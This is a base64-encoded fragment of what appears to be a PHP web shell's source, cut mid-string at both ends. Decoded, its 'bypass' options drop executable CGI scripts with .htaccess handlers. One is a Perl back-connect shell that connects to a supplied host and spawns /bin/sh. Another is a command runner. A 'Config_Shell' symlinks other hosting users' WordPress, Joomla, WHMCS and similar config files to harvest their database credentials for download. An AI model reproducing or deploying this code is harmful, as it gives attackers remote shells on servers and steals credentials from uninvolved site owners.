JpSTdEUW9nSUNBZ0lDQWdJR1Y0YVhRbwpNU2s3RFFvZ0lDQWdJQ0I5RFFvZ0lDQWdJQ0J3Y21sdWRDQWlXeXBkSUVSMWJYQnBibWNnUVhKbmRXMWxiblJ6WEc0aU93MEtJQ0FnCklDQWdKR2h2YzNRZ1BTQWtRVkpIVmxzd1hUc05DaUFnSUNBZ0lDUndiM0owSUQwZ09EQTdEUW9nSUNBZ0lDQnBaaUFvSkVGU1IxWmIKTVYwcElIc05DaUFnSUNBZ0lDQWdKSEJ2Y25RZ1BTQWtRVkpIVmxzeFhUc05DaUFnSUNBZ0lIME5DaUFnSUNBZ0lIQnlhVzUwSUNKYgpLbDBnUTI5dWJtVmpkR2x1Wnk0dUxseHVJanNOQ2lBZ0lDQWdJQ1J3Y205MGJ5QTlJR2RsZEhCeWIzUnZZbmx1WVcxbEtDZDBZM0FuCktTQjhmQ0JrYVdVb0lsVnVhMjV2ZDI0Z1VISnZkRzlqYjJ4Y2JpSXBPdzBLSUNBZ0lDQWdjMjlqYTJWMEtGTkZVbFpGVWl3Z1VFWmYKU1U1RlZDd2dVMDlEUzE5VFZGSkZRVTBzSUNSd2NtOTBieWtnZkh3Z1pHbGxJQ2dpVTI5amEyVjBJRVZ5Y205eVhHNGlLVHNOQ2lBZwpJQ0FnSUcxNUlDUjBZWEpuWlhRZ1BTQnBibVYwWDJGMGIyNG9KR2h2YzNRcE93MEtJQ0FnSUNBZ2FXWWdLQ0ZqYjI1dVpXTjBLRk5GClVsWkZVaXdnY0dGamF5QWlVMjVCTkhnNElpd2dNaXdnSkhCdmNuUXNJQ1IwWVhKblpYUXBLU0I3RFFvZ0lDQWdJQ0FnSUdScFpTZ2kKVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1JjYmlJcE93MEtJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ2NISnBiblFnSWxzcVhTQlRjR0YzYm1sdQpaeUJUYUdWc2JGeHVJanNOQ2lBZ0lDQWdJR2xtSUNnaFptOXlheWdnS1NrZ2V3MEtJQ0FnSUNBZ0lDQnZjR1Z1S0ZOVVJFbE9MQ0krCkpsTkZVbFpGVWlJcE93MEtJQ0FnSUNBZ0lDQnZjR1Z1S0ZOVVJFOVZWQ3dpUGlaVFJWSldSVklpS1RzTkNpQWdJQ0FnSUNBZ2IzQmwKYmloVFZFUkZVbElzSWo0bVUwVlNWa1ZTSWlrN0RRb2dJQ0FnSUNBZ0lHVjRaV01nZXljdlltbHVMM05vSjMwZ0p5MWlZWE5vSnlBdQpJQ0pjTUNJZ2VDQTBPdzBLSUNBZ0lDQWdJQ0JsZUdsMEtEQXBPdzBLSUNBZ0lDQWdmUTBLSUNBZ0lDQWdjSEpwYm5RZ0lsc3FYU0JFCllYUmhZMmhsWkZ4dVhHNGlPdz09JzsKCiRmaWxlID0gZm9wZW4oImRjLnBsIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJG5ldGNhdHNoZWxsKSk7CmZjbG9zZSgkZmlsZSk7CiAgICBjaG1vZCgiZGMucGwiLDA3NTUpOwoKICAgZWNobyAiPC9icj48YSBocmVmPSdieXBhc3MvY2dpX3NoZWxsL2l6by5jaW4nIHRhcmdldD0nX2JsYW5rJz4gR28gVG8gW0NnaV9TaGVsbF0gPj48L2E+IjsKYnJlYWs7CgpjYXNlICJNaW5pX0NnaSI6CiAgICBAbWtkaXIoJ2J5cGFzcy9jZ2lydW4nLCAwNzU1KTsKICAgIGNoZGlyKCdieXBhc3MvY2dpcnVuJyk7CiAgICAgICAgJHRrbCA9ICIuaHRhY2Nlc3MiOwogICAgICAgICR0a2xfbm90ZSA9ICIkdGtsIjsKICAgICAgICAkZG9keSA9IGZvcGVuICgkdGtsX25vdGUgLCAndycpIG9yIGRpZSAoImRvZHkgYSYjMjMxOyYjMzA1O2xhbWFkJiMzMDU7ISIpOwogICAgICAgICRtZXRpbiA9ICJBZGRIYW5kbGVyIGNnaS1zY3JpcHQgLnByIjsgICAgCiAgICAgICAgZndyaXRlICggJGRvZHkgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkZG9keSk7CiRjZ2ljbyA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0lDMUpMM1Z6Y2k5c2IyTmhiQzlpWVc1a2JXRnBiZzBLSXcwS0l5QlFaWEpzUzJsMExUQXVNU0F0CklGdEViMkZ5SUhWelpYSnBhU0JwYm5KbFoybHpkSEpoZEdrZ2NHOTBJSFpsWkdWaElHeHBibXQxY21sc1pTNGdYUTBLSXcwS0l5QmoKYldRdWNHdzZJRkoxYmlCamIyMXRZVzVrY3lCdmJpQmhJSGRsWW5ObGNuWmxjZzBLRFFwMWMyVWdjM1J5YVdOME93MEtEUXB0ZVNBbwpKR050WkN3Z0pVWlBVazBwT3cwS0RRb2tmRDB4T3cwS0RRcHdjbWx1ZENBaVEyOXVkR1Z1ZEMxVWVYQmxPaUIwWlhoMEwyaDBiV3hjCmNseHVJanNOQ25CeWFXNTBJQ0pjY2x4dUlqc05DZzBLSXlCSFpYUWdjR0Z5WVcxbGRHVnljdzBLRFFvbFJrOVNUU0E5SUhCaGNuTmwKWDNCaGNtRnRaWFJsY25Nb0pFVk9WbnNuVVZWRlVsbGZVMVJTU1U1SEozMHBPdzBLRFFwcFppaGtaV1pwYm1Wa0lDUkdUMUpOZXlkagpiV1FuZlNrZ2V3MEtJQ0FrWTIxa0lEMGdKRVpQVWsxN0oyTnRaQ2Q5T3cwS2ZRMEtEUXB3Y21sdWRDQW5QRWhVVFV3K0RRbzhZbTlrCmVUNE5DanhtYjNKdElHRmpkR2x2YmowaUlpQnRaWFJvYjJROUlrZEZWQ0krRFFvOGFXNXdkWFFnZEhsd1pUMGlkR1Y0ZENJZ2JtRnQKWlQwaVkyMWtJaUJ6YVhwbFBUUTFJSFpoYkhWbFBTSW5JQzRnSkdOdFpDQXVJQ2NpUGcwS1BHbHVjSFYwSUhSNWNHVTlJbk4xWW0xcApkQ0lnZG1Gc2RXVTlJbEoxYmlJK0RRbzhMMlp2Y20wK0RRbzhjSEpsUGljN0RRb05DbWxtS0dSbFptbHVaV1FnSkVaUFVrMTdKMk50ClpDZDlLU0I3RFFvZ0lIQnlhVzUwSUNKU1pYTjFiSFJ6SUc5bUlDY2tZMjFrSnlCbGVHVmpkWFJwYjI0NlhHNWNiaUk3RFFvZ0lIQnkKYVc1MElDSXRJbmc0TURzTkNpQWdjSEpwYm5RZ0lseHVJanNOQ2cwS0lDQnZjR1Z1S0VOTlJDd2dJaWdrWTIxa0tTQXlQaVl4SUh3aQpLU0I4ZkNCd2NtbHVkQ0FpUTI5MWJHUWdibTkwSUdWNFpXTjFkR1VnWTI5dGJXRnVaQ0k3RFFvTkNpQWdkMmhwYkdVb1BFTk5SRDRwCklIc05DaUFnSUNCd2NtbHVkRHNOQ2lBZ2ZRMEtEUW9nSUdOc2IzTmxLRU5OUkNrN0RRb2dJSEJ5YVc1MElDSXRJbmc0TURzTkNpQWcKY0hKcGJuUWdJbHh1SWpzTkNuME5DZzBLY0hKcGJuUWdJand2Y0hKbFBpSTdEUW9OQ25OMVlpQndZWEp6WlY5d1lYSmhiV1YwWlhKegpJQ2drS1NCN0RRb2dJRzE1SUNWeVpYUTdEUW9OQ2lBZ2JYa2dKR2x1Y0hWMElEMGdjMmhwWm5RN0RRb05DaUFnWm05eVpXRmphQ0J0CmVTQWtjR0ZwY2lBb2MzQnNhWFFvSnlZbkxDQWthVzV3ZFhRcEtTQjdEUW9nSUNBZ2JYa2dLQ1IyWVhJc0lDUjJZV3gxWlNrZ1BTQnoKY0d4cGRDZ25QU2NzSUNSd1lXbHlMQ0F5S1RzTkNpQWdJQ0FOQ2lBZ0lDQnBaaWdrZG1GeUtTQjdEUW9nSUNBZ0lDQWtkbUZzZFdVZwpQWDRnY3k5Y0t5OGdMMmNnT3cwS0lDQWdJQ0FnSkhaaGJIVmxJRDErSUhNdkpTZ3VMaWt2Y0dGamF5Z25ZeWNzYUdWNEtDUXhLU2t2ClpXYzdEUW9OQ2lBZ0lDQWdJQ1J5WlhSN0pIWmhjbjBnUFNBa2RtRnNkV1U3RFFvZ0lDQWdmUTBLSUNCOURRb05DaUFnY21WMGRYSnUKSUNWeVpYUTdEUXA5JzsKCiRmaWxlID0gZm9wZW4oImNnaS5wciIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjZ2ljbykpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoImNnaS5wciIsMDc1NSk7CiAgIGVjaG8gIjwvYnI+PGEgaHJlZj0nYnlwYXNzL2NnaXJ1bi9jZ2kucHInIHRhcmdldD0nX2JsYW5rJz4gR28gVG8gW01pbmkgQ2dpXSA+PjwvYT4iOwpicmVhazsKY2FzZSAiQ29uZmlnX1NoZWxsIjoKICAgIEBta2RpcignYnlwYXNzL2NvbmZpZ2xlcicsIDA3NTUpOwogICAgY2hkaXIoJ2J5cGFzcy9jb25maWdsZXInKTsKICAgICAgICAkdGtsID0gIi5odGFjY2VzcyI7CiAgICAgICAgJHRrbF9ub3RlID0gIiR0a2wiOwogICAgICAgICRkb2R5ID0gZm9wZW4gKCR0a2xfbm90ZSAsICd3Jykgb3IgZGllICgiZG9keSBhJiMyMzE7JiMzMDU7bGFtYWQmIzMwNTshIik7CiAgICAgICAgJG1ldGluID0gIkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuaXpvIjsgICAgCiAgICAgICAgZndyaXRlICggJGRvZHkgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkZG9keSk7CiRjb25maWdzaGVsbCA9ICdJeUV2ZFhOeUwySnBiaTl3WlhKc0lDMUpMM1Z6Y2k5c2IyTmhiQzlpWVc1a2JXbHVEUXB3Y21sdWRDQWlRMjl1ZEdWdWRDMTBlWEJsT2lCMFpYaDBMMmgwYld4Y2JseHVJanNOQ25CeWFXNTBKendoUkU5RFZGbFFSU0JvZEcxc0lGQlZRa3hKUXlBaUxTOHZWek5ETHk5RVZFUWdXRWhVVFV3Z01TNHdJRlJ5WVc1emFYUnBiMjVoYkM4dlJVNGlJQ0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTlVVWk5NGFIUnRiREV2UkZSRUwzaG9kRzFzTVMxMGNtRnVjMmwwYVc5dVlXd3VaSFJrSWo0TkNqeG9kRzFzSUhodGJHNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0TkNqeG9aV0ZrUGcwS1BHMWxkR0VnYUhSMGNDMWxjWFZwZGowaVEyOXVkR1Z1ZEMxTVlXNW5kV0ZuWlNJZ1kyOXVkR1Z1ZEQwaVpXNHRkWE1pSUM4K0RRbzhiV1YwWVNCb2RIUndMV1Z4ZFdsMlBTSkRiMjUwWlc1MExWUjVjR1VpSUdOdmJuUmxiblE5SW5SbGVIUXZhSFJ0YkRzZ1kyaGhjbk5sZEQxMWRHWXRPQ0lnTHo0TkNqeDBhWFJzWlQ1YmZsMGdRM2xpTTNJdFJGb2dRMjl1Wm1sbklDMGdXMzVkSUR3dmRHbDBiR1UrRFFvOGMzUjViR1VnZEhsd1pUMGlkR1Y0ZEM5amMzTWlQZzBLTG01bGQxTjBlV3hsTVNCN0RRb2dabTl1ZEMxbVlXMXBiSGs2SUZSaGFHOXRZVHNOQ2lCbWIyNTBMWE5wZW1VNklIZ3RjMjFoYkd3N0RRb2dabTl1ZEMxM1pXbG5hSFE2SUdKdmJHUTdEUW9nWTI5c2IzSTZJQ013TUVaR1JrWTdEUW9nSUhSbGVIUXRZV3hwWjI0NklHTmxiblJsY2pzTkNuME5Dand2YzNSNWJHVStEUW84TDJobFlXUStEUW9uT3cwS2MzVmlJR3hwYkhzTkNpQWdJQ0FvSkhWelpYSXBJRDBnUUY4N0RRb2tiWE55SUQwZ2NYaDdjSGRrZlRzTkNpUnJiMnhoUFNSdGMzSXVJaThpTGlSMWMyVnlPdzBLSkd0dmJHRTlmbk12WEc0dkwyYzdJQTBLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJsdVkyeDFaR1Z6TDJOdmJtWnBaM1Z5WlM1d2FIQW5MQ1JyYjJ4aExpY3RjMmh2Y0M1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5aGJXVnRZbVZ5TDJOdmJtWnBaeTVwYm1NdWNHaHdKeXdrYTI5c1lTNG5MV0Z0WlcxaVpYSXVkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMjl1Wm1sbkxtbHVZeTV3YUhBbkxDUnJiMnhoTGljdFlXMWxiV0psY2pJdWRIaDBKeWs3RFFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmJXVnRZbVZ5Y3k5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxdFpXMWlaWEp6TG5SNGRDY3BPdzBLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJOdmJtWnBaeTV3YUhBbkxDUnJiMnhoTGljeUxuUjRkQ2NwT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyWnZjblZ0TDJsdVkyeDFaR1Z6TDJOdmJtWnBaeTV3YUhBbkxDUnJiMnhoTGljdFptOXlkVzB1ZEhoMEp5azdEUXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WVdSdGFXNHZZMjl1Wmk1d2FIQW5MQ1JyYjJ4aExpYzFMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMkZrYldsdUwyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpYzBMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMM2R3TFdOdmJtWnBaeTV3YUhBbkxDUnJiMnhoTGljdGQzQXhNeTUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlpYkc5bkwzZHdMV052Ym1acFp5NXdhSEFuTENScmIyeGhMaWN0ZDNBdFlteHZaeTUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlqYjI1bVgyZHNiMkpoYkM1d2FIQW5MQ1JyYjJ4aExpYzJMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMmx1WTJ4MVpHVXZaR0l1Y0dod0p5d2thMjlzWVM0bk55NTBlSFFuS1RzTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjV1WldOMExuQm9jQ2NzSkd0dmJHRXVKemd1ZEhoMEp5azdEUXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2Yld0ZlkyOXVaaTV3YUhBbkxDUnJiMnhoTGljNUxuUjRkQ2NwT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wybHVZMngxWkdVdlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6RXlMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMnB2YjIxc1lTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXFiMjl0YkdFdWRIaDBKeWs3RFFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmRtSXZhVzVqYkhWa1pYTXZZMjl1Wm1sbkxuQm9jQ2NzSkd0dmJHRXVKeTEyWWk1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5cGJtTnNkV1JsY3k5amIyNW1hV2N1Y0dod0p5d2thMjlzWVM0bkxXbHVZMngxWkdWekxYWmlMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMM2RvYlM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxM2FHMHhOUzUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzkzYUcxakwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxYZG9iV014Tmk1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5M2FHMWpjeTlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTEzYUcxamN5NTBlSFFuS1RzTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXpkWEJ3YjNKMEwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxYTjFjSEJ2Y25RdWRIaDBKeWs3RFFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljeGQyaHRZM011ZEhoMEp5azdEUXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YzNWaWJXbDBkR2xqYTJWMExuQm9jQ2NzSkd0dmJHRXVKeTEzYUcxamN6SXVkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMnhwWlc1MGN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWpiR2xsYm5SekxuUjRkQ2NwT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnNhV1Z1ZEM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxamJHbGxiblF1ZEhoMEp5azdEUXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WTJ4cFpXNTBaWE12WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WTJ4cFpXNTBjeTUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlpYVd4c2FXNW5MMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV0pwYkd4cGJtY3VkSGgwSnlrN0lBMEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMjFoYm1GblpTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWlhV3hzYVc1bkxuUjRkQ2NwT3lBTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXRlUzlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTFpYVd4c2FXNW5MblI0ZENjcE95QU5Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl0ZVhOb2IzQXZZMjl1Wm1sbmRYSmhkR2x2Ymk1d2FIQW5MQ1JyYjJ4aExpY3RZbWxzYkdsdVp5NTBlSFFuS1RzZ0RRcDlEUXBwWmlBb0pFVk9WbnNuVWtWUlZVVlRWRjlOUlZSSVQwUW5mU0JsY1NBblVFOVRWQ2NwSUhzTkNpQWdjbVZoWkNoVFZFUkpUaXdnSkdKMVptWmxjaXdnSkVWT1Zuc25RMDlPVkVWT1ZGOU1SVTVIVkVnbmZTazdEUXA5SUdWc2MyVWdldzBLSUNBa1luVm1abVZ5SUQwZ0pFVk9WbnNuVVZWRlVsbGZVMVJTU1U1SEozMDdEUXA5RFFwQWNHRnBjbk1nUFNCemNHeHBkQ2d2Smk4c0lDUmlkV1ptWlhJcE93MEtabTl5WldGamFDQWtjR0ZwY2lBb1FIQmhhWEp6S1NCN0RRb2dJQ2drYm1GdFpTd2dKSFpoYkhWbEtTQTlJSE53YkdsMEtDODlMeXdnSkhCaGFYSXBPdzBLSUNBa2JtRnRaU0E5ZmlCMGNpOHJMeUF2T3cwS0lDQWtibUZ0WlNBOWZpQnpMeVVvVzJFdFprRXRSakF0T1YxYllTMW1RUzFHTUMwNVhTa3ZjR0ZqYXlnaVF5SXNJR2hsZUNna01Ta3BMMlZuT3cwS0lDQWtkbUZzZFdVZ1BYNGdkSEl2S3k4Z0x6c05DaUFnSkhaaGJIVmxJRDErSUhNdkpTaGJZUzFtUVMxR01DMDVYVnRoTFdaQkxVWXdMVGxkS1M5d1lXTnJLQ0pESWl3Z2FHVjRLQ1F4S1NrdlpXYzdEUW9nSUNSR1QxSk5leVJ1WVcxbGZTQTlJQ1IyWVd4MVpUc05DbjBOQ21sbUlDZ2tSazlTVFh0d1lYTnpmU0JsY1NBaUlpbDdEUXB3Y21sdWRDQW5EUW84WW05a2VTQmpiR0Z6Y3owaWJtVjNVM1I1YkdVeElpQmlaMk52Ykc5eVBTSWpNREF3TURBd0lqNE5Danh3UGtONVlqTnlMV1I2SUVOdmJtWnBaeUE4TDNBK0RRbzhjRDQ4Wm05dWRDQmpiMnh2Y2owaUkwTXdRekJETUNJK1d6d3ZabTl1ZEQ0Z1EyOWtaV1FnUW5rZ1EzbGlNM0l0UkZvZ1BHWnZiblFnWTI5c2IzSTlJaU5ETUVNd1F6QWlQand2Wm05dWRENGdEUW84YzNCaGJpQnBaRDBpY21WemRXeDBYMkp2ZUNJZ1kyeGhjM005SW5Ob2IzSjBYM1JsZUhRaUlHeGhibWM5SW1WdUlqNDhjM0JoYmlCemRIbHNaU0IwYVhSc1pUNE5DanhtYjI1MElHTnZiRzl5UFNJalF6QkRNRU13SWo1OFBDOW1iMjUwUGp3dmMzQmhiajQ4TDNOd1lXNCtJRHhoSUdoeVpXWTlJbWgwZEhBNkx5OTNkM2N1WjJGNllTMW9ZV05yWlhJdWJtVjBMMk5qSWo0TkNqeHpjR0Z1SUhOMGVXeGxQU0owWlhoMExXUmxZMjl5WVhScGIyNDZJRzV2Ym1VaVBqeG1iMjUwSUdOdmJHOXlQU0lqTURCR1JqQXdJajUzZDNjdVoyRjZZUzFvWVdOclpYSXVibVYwTDJOalBDOW1iMjUwUGp3dmMzQmhiajQ4TDJFK0lBMEtQR1p2Ym5RZ1kyOXNiM0k5SWlORE1FTXdRekFpUGwwOEwyWnZiblErUEM5d1BnMEtQR1p2Y20wZ2JXVjBhRzlrUFNKd2IzTjBJajROQ2p4MFpYaDBZWEpsWVNCdVlXMWxQU0p3WVhOeklpQnpkSGxzWlQwaVltOXlaR1Z5T2pGd2VDQmtiM1IwWldRZ0l6QXdSa1pHUmpzZ2QybGtkR2c2SURVME0zQjRPeUJvWldsbmFIUTZJRFF5TUhCNE95QmlZV05yWjNKdmRXNWtMV052Ykc5eU9pTXdRekJETUVNN0lHWnZiblF0Wm1GdGFXeDVPbFJoYUc5dFlUc2dabTl1ZEMxemFYcGxPamh3ZERzZ1kyOXNiM0k2SXpBd1JrWkdSaUlnSUQ0OEwzUmxlSFJoY21WaFBqeGljaUF2UGcwS0ptNWljM0E3UEhBK0RRbzhhVzV3ZFhRZ2JtRnRaVDBpZEdGeUlpQjBlWEJsUFNKMFpYaDBJaUJ6ZEhsc1pUMGlZbTl5WkdWeU9qRndlQ0JrYjNSMFpXUWdJekF3UmtaR1Jqc2dkMmxrZEdnNklESXhNbkI0T3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNd1F6QkRNRU03SUdadmJuUXRabUZ0YVd4NU9sUmhhRzl0WVRzZ1ptOXVkQzF6YVhwbE9qaHdkRHNnWTI5c2IzSTZJekF3UmtaR1Jqc2dJaUFnTHo0OFluSWdMejROQ2ladVluTndPend2Y0Q0TkNqeHdQZzBLUEdsdWNIVjBJRzVoYldVOUlsTjFZbTFwZERFaUlIUjVjR1U5SW5OMVltMXBkQ0lnZG1Gc2RXVTlJa2RsZENCRGIyNW1hV2NpSUhOMGVXeGxQU0ppYjNKa1pYSTZNWEI0SUdSdmRIUmxaQ0FqTURCR1JrWkdPeUIzYVdSMGFEb2dPVGs3SUdadmJuUXRabUZ0YVd4NU9sUmhhRzl0WVRzZ1ptOXVkQzF6YVhwbE9qRXdjSFE3SUdOdmJHOXlPaU13TUVaR1JrWTdJSFJsZUhRdGRISmhibk5tYjNKdE9uVndjR1Z5WTJGelpUc2dhR1ZwWjJoME9qSXpPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaU13UXpCRE1FTWlJQzgrUEM5d1BnMEtQQzltYjNKdFBpYzdEUXA5Wld4elpYc05Da0JzYVc1bGN5QTlQQ1JHVDFKTmUzQmhjM045UGpzTkNpUjVJRDBnUUd4cGJtVnpPdzBLYjNCbGJpQW9UVmxHU1V4RkxDQWlQblJoY2k1MGJYQWlLVHNOQ25CeWFXNTBJRTFaUmtsTVJTQWlkR0Z5SUMxamVtWWdJaTRrUms5U1RYdDBZWEo5TGlJdWRHRnlJQ0k3RFFwbWIzSWdLQ1JyWVQwd095UnJZVHdrZVRza2EyRXJLeWw3RFFwM2FHbHNaU2hBYkdsdVpYTmJKR3RoWFNBZ1BYNGdiUzhvTGlvL0tUcDRPaTluS1hzTkNpWnNhV3dvSkRFcE93MEtjSEpwYm5RZ1RWbEdTVXhGSUNReExpSXVkSGgwSUNJN0RRcG1iM0lvSkd0a1BURTdKR3RrUERFNE95UnJaQ3NyS1hzTkNuQnlhVzUwSUUxWlJrbE1SU0FrTVM0a2EyUXVJaTUwZUhRZ0lqc05DbjBOQ24wTkNpQjlEUXB3Y21sdWRDYzhZbTlrZVNCamJHRnpjejBpYm1WM1UzUjViR1V4SWlCaVoyTnZiRzl5UFNJak1EQXdNREF3SWo0TkNqeHdQa1J2Ym1VZ0lTRThMM0ErRFFvOGNENG1ibUp6Y0RzOEwzQStKenNOQ21sbUtDUkdUMUpOZTNSaGNuMGdibVVnSWlJcGV3MEtiM0JsYmloSlRrWlBMQ0FpZEdGeUxuUnRjQ0lwT3cwS1FHeHBibVZ6SUQwOFNVNUdUejRnT3cwS1kyeHZjMlVvU1U1R1R5azdEUXB6ZVhOMFpXMG9RR3hwYm1WektUc05DbkJ5YVc1MEp6eHdQanhoSUdoeVpXWTlJaWN1SkVaUFVrMTdkR0Z5ZlM0bkxuUmhjaUkrUEdadmJuUWdZMjlzYjNJOUlpTXdNRVpHTURBaVBnMEtQSE53WVc0Z2MzUjViR1U5SW5SbGVIUXRaR1ZqYjNKaGRHbHZiam9nYm05dVpTSStRMnhwWTJzZ1NHVnlaU0JVYnlCRWIzZHViRzloWkNCVVlYSWdSbWxzWlR3dmMzQmhiajQ4TDJadmJuUStQQzloUGp3dmNENG5PdzBLZlEwS2ZRMEtJSEJ5YVc1MElnMEtQQzlpYjJSNVBnMEtQQzlvZEcxc1BpSTcnOwoKJGZpbGUgPSBmb3BlbigiY29uZmlnLml6byIgLCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjb25maWdzaGVsbCkpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoImNvbmZpZy5pem8iLDA3NTUpOwogICBlY2hvICI8L2JyPjxhIGhyZWY9J2J5cGFzcy9jb25maWdsZXIvY29uZmlnLml6bycgdGFyZ2V0PSdfYmxhbmsnPiBHbyBUbyBbQ29uZmlnX1NoZWxsXSA+PjwvYT4iOwogIGJyZWFrOwpjYXNlICJQeXRob25fU2hlbGwiOgoKICAgIEBta2RpcignYnlwYXNzL3B5dGhvbicsIDA3NTUpOwogICAgY2hkaXIoJ2J5cGFzcy9weXRob24nKTsKICAgICAgICAkdGtsID0gIi5odGFjY2VzcyI7CiAgICAgICAgJHRrbF9ub3RlID0gIiR0a2wiOwogICAgICAgICRkb2R5ID0gZm9wZW4gKCR0a2xfbm90ZSAsICd3Jykgb3IgZGllICgiZG9keSBhJiMyMzE7JiMzMDU7bGFtYWQmIzMwNTshIik7CiAgICAgICAgJG1ldGluID0gIkFkZEhhbmRsZXIgY2dpLXNjcmlwdCAuaXpvIjsgICAgCiAgICAgICAgZndyaXRl